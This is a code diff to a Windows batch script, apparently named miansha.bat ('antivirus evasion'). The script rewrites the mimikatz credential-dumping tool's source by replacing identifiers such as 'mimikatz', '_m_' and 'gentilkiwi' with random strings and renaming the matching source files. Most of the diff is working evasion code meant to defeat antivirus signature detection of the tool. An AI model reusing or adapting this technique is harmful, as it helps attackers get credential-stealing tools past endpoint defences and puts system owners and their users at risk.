@@ -4,16 +4,21 @@ setlocal enabledelayedexpansion
 
 set _out=
 
-call :RandomStr 10
-tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
-tools\mv ./mimikatz/mimikatz.h ./mimikatz/!_out!.h
-tools\mv ./mimikatz/mimikatz.c ./mimikatz/!_out!.c
-tools\mv ./mimikatz/mimikatz.ico ./mimikatz/!_out!.ico
-tools\mv ./mimikatz/mimikatz.rc ./mimikatz/!_out!.rc
+::call :RandomStr 10
+::tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
+::tools\mv ./mimikatz/mimikatz.h ./mimikatz/!_out!.h
+::tools\mv ./mimikatz/mimikatz.c ./mimikatz/!_out!.c
+::tools\mv ./mimikatz/mimikatz.ico ./mimikatz/!_out!.ico
+::tools\mv ./mimikatz/mimikatz.rc ./mimikatz/!_out!.rc
 
-call :RandomStr 10
-tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude *.vcxproj* --exclude miansha.bat --exclude mimikatz.sln "_m_" . | tools\xargs tools\sed -b -i "s/_m_/!_out!/g"
+echo 处理需要重名名文件的
+for %%a in (mimikatz _m_) do (
+    call :RandomStr 10
+    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%%a" . | tools\xargs tools\sed -b -i "s/%%a/!_out!/g"
+    call :FileRen _m_ !_out!
+)
 
+echo 处理不需要重名名文件的
 for %%a in (gentilkiwi MIMIKATZ) do (
     call :RandomStr 10
     tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%%a" . | tools\xargs tools\sed -b -i "s/%%a/!_out!/g"
@@ -65,4 +70,22 @@ goto:eof
     )
     set _StrList=!_StrList!fedcba9876543210
     set /a StrLen += 0x!_StrList:~16,1!
+goto:eof
+
+:: =================
+:: 文件/路径重名名
+:: =================
+::
+:FileRen <string> <string>
+    set str_1=%1
+    set str_2=%2
+
+    for /f %%i in ('dir /s /b *%str_1%*.c *%str_1%*.h') do (
+        set _var=%%i
+        if not !_var!.==. (
+            set "_var=!_var:%str_1%=%str_2%!"
+            ::echo,!_var!
+            tools\mv %%i !_var!
+        )
+    )
 goto:eof
